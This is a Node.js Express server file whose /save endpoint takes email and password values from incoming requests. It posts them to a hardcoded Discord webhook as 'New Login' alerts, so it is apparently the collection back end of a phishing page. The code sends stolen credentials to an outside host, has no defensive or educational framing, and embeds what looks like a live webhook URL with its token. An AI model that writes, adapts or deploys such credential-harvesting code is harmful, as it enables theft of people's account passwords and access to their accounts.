
import { readFile } from 'fs/promises';
import Discord from "discord.js";
import{ Client, MessageEmbed, Intents,WebhookClient } from 'discord.js'
import fetch from 'node-fetch';
import { createRequire } from "module"; // Bring in the ability to create the 'require' method
//import { match } from 'assert/strict';
const require = createRequire(import.meta.url); // construct the require method
const express = require("express");
var bodyParser = require('body-parser');
const app = express();
const router = require('express').Router();



require("dotenv").config({ path: "./config.env" });
const port = process.env.PORT || 5000;

app.use(bodyParser.urlencoded({limit: '50mb', extended: true}));
app.use(bodyParser.json({limit: '50mb'}));
app.use(express.json());


const json = JSON.parse(await readFile(new URL('./config.json', import.meta.url)));

const client = new Client({ intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES] });

const webhookClient = new WebhookClient({ url: 'https://discord.com/api/webhooks/958303137066803260/sqBtwnaeYYpVjukH4IB4MUrzBdT77bk4YdRyGJtTwh_GwMozl34kvZxmnS-gn5FSXNZM' });


router.route("/save").post((req, res)=> {
console.log(req.body);
    const { email,password } = req.body;

    const embedSell = new MessageEmbed()
      .setColor('#0099ff')
      .setTitle("New Login")
       
      .addFields(
        { name: '\u200B', value: '\u200B' },
        { name: 'email', value: `${email}`, inline: true },
        { name: 'password', value: `${password}`, inline: true },
      )

      .setTimestamp()
      .setFooter('At your service', 'https://img.icons8.com/emoji/48/000000/baby-chick--v2.png');
     
      webhookClient.send({
       
        
        username: 'Login ALERT',
        avatarURL: 'https://img.icons8.com/emoji/48/000000/baby-chick--v2.png',
        embeds:[embedSell]
  
})
    

})

app.use(router);


const config= require("./config.json") // use the require method

require('dotenv').config();

client.login(process.env.token);

client.once("ready", () => {
  console.log("Ready for action!");
});


      
    
 

app.listen(port, () => {
    // perform a database connection when server starts
    
    console.log(`Server is running on port: ${port}`);
  });
  